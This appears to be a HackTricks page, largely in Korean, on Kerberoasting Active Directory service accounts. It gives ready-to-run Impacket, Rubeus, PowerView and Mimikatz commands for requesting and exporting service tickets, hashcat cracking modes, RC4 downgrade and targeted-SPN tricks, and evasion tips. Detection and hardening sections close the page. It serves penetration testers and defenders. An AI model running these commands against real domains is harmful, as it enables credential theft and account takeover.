# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting은 TGS 티켓 획득에 초점을 맞춥니다. 특히 컴퓨터 계정을 제외한 Active Directory (AD)의 사용자 계정으로 실행되는 서비스와 연관된 티켓을 목표로 합니다. 이러한 티켓의 암호화는 사용자 비밀번호에서 유래한 키를 사용하므로 오프라인으로 자격 증명을 크래킹할 수 있습니다. 사용자 계정이 서비스로 사용되는 것은 ServicePrincipalName (SPN) 속성이 비어 있지 않은 것으로 표시됩니다.

어떤 인증된 도메인 사용자든 TGS 티켓을 요청할 수 있으므로 특별한 권한은 필요하지 않습니다.

### 핵심 포인트

- 사용자 계정으로 실행되는 서비스의 TGS 티켓을 대상으로 함(즉, SPN이 설정된 계정; 컴퓨터 계정 아님).
- 티켓은 서비스 계정 비밀번호에서 유도된 키로 암호화되며 오프라인에서 크래킹 가능.
- 권한 상승 불필요; 인증된 계정이면 누구나 TGS 티켓을 요청할 수 있음.

> [!WARNING]
> 대부분의 공개 툴은 AES보다 크래킹이 빠르기 때문에 RC4-HMAC (etype 23) 서비스 티켓 요청을 선호합니다. RC4 TGS 해시는 `$krb5tgs$23$*`로 시작하고, AES128은 `$krb5tgs$17$*`, AES256은 `$krb5tgs$18$*`로 시작합니다. 그러나 많은 환경이 AES-only로 이동하고 있습니다. RC4만 관련 있다고 가정하지 마십시오.
> 또한 “spray-and-pray” roasting은 피하십시오. Rubeus의 기본 kerberoast는 모든 SPN에 대해 쿼리하고 티켓을 요청할 수 있어 소음이 큽니다. 먼저 흥미로운 principal을 열거하고 타겟팅하세요.

### 서비스 계정 비밀 및 Kerberos 암호화 비용

많은 서비스가 여전히 수동으로 관리되는 비밀번호를 가진 사용자 계정으로 실행됩니다. KDC는 서비스 티켓을 해당 비밀번호에서 유도된 키로 암호화하여 어떤 인증된 주체에게든 암호문을 전달하므로, kerberoasting은 잠금이나 DC 텔레메트리 없이 무제한 오프라인 추측을 제공합니다. 암호화 모드가 크래킹 예산을 결정합니다:

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt blocks rainbow tables but still allows fast cracking of short passwords. |
| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | ~1000× faster than AES; attackers force RC4 whenever `msDS-SupportedEncryptionTypes` permits it. |

*Benchmarks from Chick3nman as d in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

RC4의 confounder는 단지 키스트림을 무작위화할 뿐이며, 추측당 작업량을 늘리지는 않습니다. 서비스 계정이 무작위 비밀(gMSA/dMSA, machine accounts, 또는 vault-managed strings)에 의존하지 않는 한, 타격 속도는 순전히 GPU 자원에 달려 있습니다. AES-only etypes를 강제하면 초당 수십억 건 추측의 우월성을 제거할 수 있지만, 약한 인간 비밀번호는 여전히 PBKDF2에 의해 무너집니다.

### 공격

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
kerberoast 검사를 포함한 다기능 도구:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- kerberoastable 사용자 열거
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: TGS 요청 및 dump from memory
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- 기법 2: 자동화 도구
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> TGS 요청은 Windows Security Event 4769를 생성합니다 (Kerberos 서비스 티켓이 요청되었습니다).

### OPSEC 및 AES 전용 환경

- 의도적으로 AES가 없는 계정에 대해 RC4 요청:
- Rubeus: `/rc4opsec`는 tgtdeleg을 사용하여 AES가 없는 계정을 열거하고 RC4 서비스 티켓을 요청합니다.
- Rubeus: `/tgtdeleg`을 kerberoast와 함께 사용하면 가능한 경우 RC4 요청도 트리거합니다.
- 조용히 실패하는 대신 AES 전용 계정을 Roast:
- Rubeus: `/aes`는 AES가 활성화된 계정을 열거하고 AES 서비스 티켓(etype 17/18)을 요청합니다.
- 이미 TGT(PTT이거나 .kirbi에서 얻은 경우)를 보유하고 있다면 `/ticket:<blob|path>`를 `/spn:<SPN>` 또는 `/spns:<file>`와 함께 사용하여 LDAP을 건너뛸 수 있습니다.
- 대상 지정, 쓰로틀링 및 노이즈 감소:
- 사용: `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` 및 `/jitter:<1-100>`.
- `/pwdsetbefore:<MM-dd-yyyy>`(이전 비밀번호)를 사용해 약할 가능성이 있는 암호를 필터링하거나 `/ou:<DN>`로 권한 있는 OU를 대상으로 지정하세요.

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### 지속성 / 악용

계정을 제어하거나 수정할 수 있다면 SPN을 추가해 계정을 kerberoastable로 만들 수 있습니다:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
더 쉬운 cracking을 위해 RC4를 활성화하도록 계정을 다운그레이드합니다(대상 객체에 대한 쓰기 권한 필요):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### GenericWrite/GenericAll로 사용자에 대한 Targeted Kerberoast (임시 SPN)

When BloodHound shows that you have control over a user object (e.g., GenericWrite/GenericAll), you can reliably “targeted-roast” that specific user even if they do not currently have any SPNs:

- 제어 중인 사용자에게 임시 SPN을 추가하여 roastable 상태로 만듭니다.
- 해당 SPN에 대해 RC4 (etype 23)로 암호화된 TGS-REP를 요청하여 cracking에 유리하게 만듭니다.
- hashcat으로 `$krb5tgs$23$...` 해시를 crack합니다.
- footprint를 줄이기 위해 SPN을 정리합니다.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux 한 줄 명령(targetedKerberoast.py는 SPN 추가 -> TGS (etype 23) 요청 -> SPN 제거를 자동화합니다):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
출력값을 hashcat autodetect로 크랙하세요 (mode 13100 for `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: SPN을 추가/제거하면 디렉터리 변경이 발생합니다(대상 사용자에 대한 Event ID 5136/4738) 및 TGS 요청은 Event ID 4769를 생성합니다. 과도한 요청(throttling)을 고려하고 즉시 정리(cleanup)하세요.

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (deprecated on some distros)
- `rdate -n <DC_IP>`

### 도메인 계정 없이 Kerberoast 수행 (AS-requested STs)

In September 2022, Charlie Clark showed that if a principal does not require pre-authentication, it’s possible to obtain a service ticket via a crafted KRB_AS_REQ by altering the sname in the request body, effectively getting a service ticket instead of a TGT. This mirrors AS-REP roasting and does not require valid domain credentials.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> 유효한 자격 증명이 없으면 이 기법으로 LDAP를 쿼리할 수 없으므로 사용자 목록을 반드시 제공해야 합니다.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
관련

AS-REP roastable 사용자를 대상으로 하는 경우, 다음을 참조하세요:

{{#ref}}
asreproast.md
{{#endref}}

### 탐지

Kerberoasting은 은밀할 수 있습니다. DCs(도메인 컨트롤러)에서 Event ID 4769를 수집하고 노이즈를 줄이기 위해 필터를 적용하세요:

- 서비스 이름 `krbtgt` 및 `$`로 끝나는 서비스 이름(컴퓨터 계정)을 제외하세요.
- 컴퓨터 계정의 요청(`*$$@*`)을 제외하세요.
- 성공한 요청만(실패 코드 `0x0`).
- 암호화 유형을 추적하세요: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). `0x17`만으로 경보를 발생시키지 마세요.

예시 PowerShell 초기 분석:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Additional ideas:

- 호스트/사용자별 정상 SPN 사용의 기준선을 설정하고; 단일 principal(주체)에서 발생하는 서로 다른 SPN 요청의 대량 급증을 탐지하여 경보를 발생시키세요.
- AES로 강화된 도메인에서 비정상적인 RC4 사용을 표시(탐지)하세요.

### Mitigation / Hardening

- 서비스에 gMSA/dMSA 또는 머신 계정을 사용하세요. 관리형 계정은 120자 이상의 무작위 비밀번호를 가지며 자동으로 교체되므로 오프라인 크래킹이 사실상 불가능합니다.
- 서비스 계정에 대해 `msDS-SupportedEncryptionTypes`를 AES 전용(decimal 24 / hex 0x18)으로 설정한 후 비밀번호를 교체하여 AES 키가 파생되도록 하세요.
- 가능하면 환경에서 RC4를 비활성화하고 RC4 사용 시도를 모니터링하세요. DC(도메인 컨트롤러)에서는 `msDS-SupportedEncryptionTypes`가 설정되지 않은 계정의 기본값을 제어하기 위해 `DefaultDomainSupportedEncTypes` 레지스트리 값을 사용할 수 있습니다. 철저히 테스트하세요.
- 사용자 계정에서 불필요한 SPN을 제거하세요.
- 관리형 계정이 불가능한 경우 길고 무작위인 서비스 계정 비밀번호(25자 이상)를 사용하세요; 흔한 비밀번호는 금지하고 정기적으로 감사하세요.

## References

- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: 레거시 Kerberos 암호화에서의 저기술·고영향 공격 (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting 문서](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
